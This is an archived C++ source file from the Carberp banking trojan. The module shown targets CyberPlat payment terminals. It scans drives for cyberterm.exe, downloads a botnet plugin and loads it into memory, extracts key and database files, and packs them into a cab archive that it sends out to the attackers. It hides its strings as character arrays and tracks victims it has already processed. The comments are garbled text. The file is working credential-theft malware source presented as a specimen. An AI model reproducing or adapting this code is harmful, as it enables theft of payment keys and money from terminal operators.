/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------

#include <shlobj.h>

#include "CyberPlatDLL.h"
#include "BotCore.h"
#include "Loader.h"
#include "DLLLoader.h"
#include "CabPacker.h"
#include "Plugins.h"
#include "VideoRecorder.h"



//------------------------  ���� ������� ���������� ��� ����  -----------------------//
#include "Sber.h"
#include "Inject.h"

//------------------------------------------------------------------------------------//



//#include "BotDebug.h"

namespace CYBERPLATDBGTEMPLATES
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define CPDDBG CYBERPLATDBGTEMPLATES::DBGOutMessage<>


//---------------------------------------------------------------------------

const static char CyberPlatPath[] = {'b','i','n','\\','p','a','y','m','e','n','t','m','o','d','u','l','e','\\', 0};
const static char CyberPlatApp[]  = {'c', 'y', 'b', 'e', 'r', 't', 'e', 'r', 'm', '.', 'e', 'x', 'e',  0};
const static char CyberPlatDB[]   = {'c','y','b','e','r','t','e','r','m','.','m','d','b',0};

#define HASH_CYBERTERM 0x210FD341 /* cyberterm.exe */


//---------------------------------------------------------------------------
PCHAR CyberPlatGetTempPath()
{
	// ������� ���������� ���� ��� �������� ��������� ������
	const static char CBTempPath[] = {'c', 'p', 't', 'm', 'p',  0};

	PCHAR Path = STR::Alloc(MAX_PATH);
	if (Path == NULL)
		return NULL;

	pGetTempPathA( MAX_PATH, Path );
	StrConcat(Path, (PCHAR)CBTempPath);
	return Path;
}
//---------------------------------------------------------------------------

PCHAR CyberPlatGetStotageFileName()
{
	// ������� ���������� ������ ��� �����
	// ��� ����� ��������� ������ �� ������������
	// ����������

    const static char FileName[] = {'c', 'b', 'r', 'p', 'l', 's', 't', 'f', '0', '1', '.', 'd', 'a', 't',  0};

    return BOT::GetWorkPath(NULL, (PCHAR)FileName);

}
//---------------------------------------------------------------------------

bool CyberPlatAddFileToBase(PCHAR AppFileName, bool OnlyCheckInBas)
{
	// ������� ��������� ���������� �� ������������ ����� � ����.
	// ������ ������ ���� ������ ���� �� �������������
	if (STR::IsEmpty(AppFileName))
		return false;

	DWORD Hash = STR::GetHash(AppFileName, 0, true);

	PCHAR FileName = CyberPlatGetStotageFileName();
	if (FileName == NULL)
		return true;

	// ��������� ���� �� ������ ��� � ����
	DWORD BufSize = 0;
	PDWORD Buf = (PDWORD)File::ReadToBufferA(FileName, BufSize);
	if (Buf != NULL)
	{
		DWORD Count = BufSize / sizeof(Hash);
		PDWORD Temp = Buf;
		for (DWORD i = 0; i < Count; i++, Temp++)
        {
			if (*Temp == Hash)
			{
				MemFree(Buf);
				return false;
            }
		}
	}

	// � ������ ���� �������� ������ ��������, �� ��������� ���������
	if (OnlyCheckInBas)
	{
		if (Buf != NULL)
			MemFree(Buf);
		return true;
    }

	// ���������� ��� � ����
	DWORD NewBufSize = sizeof(Hash) + BufSize;
	PDWORD NewBuf = (PDWORD)MemAlloc(NewBufSize);
	if (NewBuf == NULL) return true;


	*NewBuf = Hash;

	// ��������� ������ ������
	if (Buf != NULL)
	{
		m_memcpy((LPBYTE)NewBuf + sizeof(Hash), Buf, BufSize);
		MemFree(Buf);
	}

	// ��������� ������
	File::WriteBufferA(FileName, NewBuf, NewBufSize);

	STR::Free(FileName);

	return true;

}
//---------------------------------------------------------------------------


void CyberPlatSendData(PCHAR Path, PCHAR AppName)
{
	// ������� �������� ������ ����������
	CPDDBG("CyberPlatDLL", "���������� ������");

	const static char SystemName[] = {'C', 'y', 'b', 'e', 'r', 'P', 'l', 'a', 't', 0};
	const static char DirName[] = {'K', 'e', 'y', 's',  0};


	PCHAR CabName = File::GetTempNameA();

	HCAB Handle = CreateCab(CabName);
	AddDirToCab(Handle, Path, (PCHAR)DirName);
	CloseCab(Handle);
	if (DataGrabber::SendCabDelayed(NULL, CabName, (PCHAR)SystemName))
	{
        CPDDBG("CyberPlatDLL", "������ ��������� � ��������� ��������");
        CyberPlatAddFileToBase(AppName, false);
    }
    pDeleteFileA(CabName);
	STR::Free(CabName);
}

//---------------------------------------------------------------------------

void CyberPlatCallPlugin(PCHAR WorkPath, PCHAR AppName)
{
	// ��������� � ��������� ������ ����������
	if (STR::IsEmpty(WorkPath)) return;

	CPDDBG("CyberPlatDLL", "������������ ���� [%s]", WorkPath);

	const static char CyberPlatPlugin[] = {'c', 'y', 'b', 'e', 'r', 'p', 'l', 'a', 't', '.', 'p', 'l', 'u', 'g',  0};
	const static char PluginProcName[] = {'P', 'r', 'o', 'c', '1',  0};

	// ��������� ������
    CPDDBG("CyberPlatDLL", "��������� ������");
	DWORD ModuleSize = 0;
	LPVOID Module    = Plugin::Download((PCHAR)CyberPlatPlugin, NULL, &ModuleSize);

	if (Module == NULL)
	{
        CPDDBG("CyberPlatDLL", "������ �����������");
		return;
	}
	CPDDBG("CyberPlatDLL", "������ ��������");
	// ��������� ����������
    HMEMORYMODULE Handle = MemoryLoadLibrary(Module);

	if (Handle != NULL)
	{
		typedef int (WINAPI *TMethod)(PCHAR, PCHAR);

		TMethod Method = (TMethod)MemoryGetProcAddress(Handle, (PCHAR)PluginProcName);

		// �������� ����� ��������� ���� ����������
		if (Method != NULL)
		{
			CPDDBG("CyberPlatDLL", "�������� ����� ���������");
			PCHAR TempPath = CyberPlatGetTempPath();
			PCHAR DBFile   = STR::New(2, WorkPath, (PCHAR)CyberPlatDB);

			Method(DBFile, TempPath);
			CyberPlatSendData(TempPath, AppName);

			STR::Free(TempPath);
			STR::Free(DBFile);
		}

		MemoryFreeLibrary(Handle);
	}


	MemFree(Module);

}


//---------------------------------------------------------------------------

void CyberPlatCheckDrive(PCHAR Drive, LPVOID Data, bool &Cancel)
{
	CPDDBG("CyberPlatDLL", "��������� ���� %s", Drive);
	// ��������� �� ����������� �� ��������� �� �����
	PCHAR FileName = STR::New(3, Drive, (PCHAR)CyberPlatPath, (PCHAR)CyberPlatApp);

	if (FileExistsA(FileName))
		if (CyberPlatAddFileToBase(FileName, true))
		{
			// ���������� ������� �������� ���������
			Cancel = true;
			PCHAR Path = STR::New(2, Drive, (PCHAR)CyberPlatPath);
			CyberPlatCallPlugin(Path, FileName);
			STR::Free(Path);
		}

    STR::Free(FileName);
}
//---------------------------------------------------------------------------


DWORD WINAPI CyberPlatCheckDrives(LPVOID Data)
{
	// ��������� ������ ��������������� ���������
	CPDDBG("CyberPlatDLL", "��������� �������� ������");
	EnumDrives(DRIVE_FIXED, CyberPlatCheckDrive, NULL);
	return 0;
}


//---------------------------------------------------------------------------


void CyberPlatCheckInstalled()
{
	//  ������� ��������� ��������
	//  ������������� ����������� ��������� �� ���� ���������
	//  ������ �������. ����� �������������� �� ���� �������,
	//  �� ��������� ���������� ���������� ���������
	StartThread(CyberPlatCheckDrives, NULL);
}
//---------------------------------------------------------------------------

DWORD WINAPI CyberPlatHandleOwtherApplication(LPVOID Data)
{
	// ������� ������������ ���������� ������� �� �������
	// � ����������� ����� ������

	if (Data == NULL)
		return 0;

	PCHAR FileName = (PCHAR)Data;
    PCHAR Path = File::ExtractFilePathA(FileName);

	if (Path != NULL)
	{
		// ��������� ������� �� ���������
		CyberPlatCallPlugin(Path, FileName);
    }

	STR::Free(FileName);
	STR::Free(Path);
	return NULL;
}

//---------------------------------------------------------------------------
void StartSending(PCHAR ModulePath);
DWORD WINAPI CopyFolderAndSendThread( LPVOID lpData );
bool CyberPlatCheckApplication(PCHAR AppName)
{
	// ������� ��������� ���������� ���������� �� ������� ����, ��
	// �������� �� �� �������������� ����������� ����������
	if (STR::IsEmpty(AppName))
		return false;
	PCHAR FileName = File::ExtractFileNameA(AppName, false);
	DWORD Hash = STR::GetHash(FileName, 0, true);
	if (Hash == HASH_CYBERTERM)
		if (CyberPlatAddFileToBase(AppName, true))
		{
			// ������ ��� ����������
			PCHAR FileNameDuplicate = STR::New(AppName);
		//	StartSending(FileNameDuplicate);
			StartThread(CyberPlatHandleOwtherApplication, FileNameDuplicate);
			return true;
		}

    return false;
}
//---------------------------------------------------------------------------
void StartSending(PCHAR ModulePathIn)
{
	CPDDBG("CyberPlatDLL","������.%s",ModulePathIn);
	//������� ������� ����, ���� �� ������, ����� ������� ��� � �����, ���� ���� � ���������� �� ����, ����� ������ �� ������
	PCHAR sTEMPProfile = STR::Alloc(MAX_PATH );
		pExpandEnvironmentStringsA( ("%AllUsersProfile%\\cyb.tmp"), sTEMPProfile, MAX_PATH);
		if(FileExistsA(sTEMPProfile))
		{
			CPDDBG("CyberPlatDLL","������ ���� ��� ����������.%s",ModulePathIn);
			DWORD size;
			char* ModulePath=(PCHAR)File::ReadToBufferA(sTEMPProfile,size);
			if(lstrcmp(ModulePath,"123")!=0 )
			{
				//MegaJump(CopyFolderAndSendThread);			
				CopyFolderAndSendThread(NULL);
				pSleep(1000*10);		
			}
			MemFree(ModulePath);

		}
		else
		{
			CPDDBG("CyberPlatDLL","����� ��� � ����, ����� ����� ��� ����� ����.%s",ModulePathIn);
			File::WriteBufferA(sTEMPProfile,ModulePathIn,STR::Length(ModulePathIn));
			//MegaJump(CopyFolderAndSendThread);			
			CopyFolderAndSendThread(NULL);
		}
		STR::Free(sTEMPProfile);
}
//---------------------------------------------------------------------------


DWORD WINAPI CopyFolderAndSendThread( LPVOID lpData )
{
	
	//������� �������� � �������� ����� �����, ����� ���� �� ���������� ������� ����� ���������� �� ���
	PCHAR Name;//= STR::Alloc(MAX_PATH);

	PCHAR sTEMPProfileSB = STR::Alloc(MAX_PATH );
	pExpandEnvironmentStringsA( ("%AllUsersProfile%\\cyb.tmp"), sTEMPProfileSB, MAX_PATH);
	if(FileExistsA(sTEMPProfileSB))
	{
		DWORD iSize;
		char* NameFile=(PCHAR)File::ReadToBufferA(sTEMPProfileSB,iSize);
		Name=STR::New(1,NameFile);

		MemFree(NameFile);
	}
	else
	{
		STR::Free(sTEMPProfileSB);
		return 0;
	}
	
	// ������ ��������
	
	CPDDBG("CyberPlatDLL","CopyFolderThread %s",Name);
	pPathRemoveFileSpecA(Name);

	// ��������� � ����� ��� ������� �������
	int ii=m_lstrlen(Name);
	Name[ii]='\0';
	Name[ii+1]='\0';

	// ���� ��������
	PCHAR sTEMPProfile = STR::Alloc(MAX_PATH );
	m_memset(sTEMPProfile,0,MAX_PATH);
	pExpandEnvironmentStringsA( ("%AllUsersProfile%\\cdat"), sTEMPProfile, MAX_PATH);
	pCreateDirectoryA(sTEMPProfile,NULL);

	// ��������� � ����� ��� ������� �������
	int i=m_lstrlen(sTEMPProfile);
	sTEMPProfile[i]='\0';
	sTEMPProfile[i+1]='\0';
	
	// ���� �����������
	bool isSend=CopyFileANdFolder(Name,sTEMPProfile);
	


	#ifdef VideoRecorderH
	//��������
		CPDDBG("CyberPlatDLL","�������� ����� %s",sTEMPProfile);
		//StartSendThread(sTEMPProfile,NULL,NULL,700);
		//StartThread(StartSendinThread,sTEMPProfile);
		//MegaJump(StartSendinThread);
	#endif
	
	if(isSend)
	{
		CPDDBG("CyberPlatDLL","����� ����� %s",sTEMPProfile);
		sTEMPProfile[i]='\0';
		sTEMPProfile[i+1]='\0';
		DeleteFolders(sTEMPProfile);
		//ClearDirectory(sTEMPProfile);
		File::WriteBufferA(sTEMPProfile, (void *)"123",3);
	}
	else
		CPDDBG("CyberPlatDLL","�� ����� ����� %s",sTEMPProfile);


	STR::Free(sTEMPProfileSB);
	STR::Free(sTEMPProfile);
	STR::Free(Name);
	return 0;
}
//---------------------------------------------------------------------------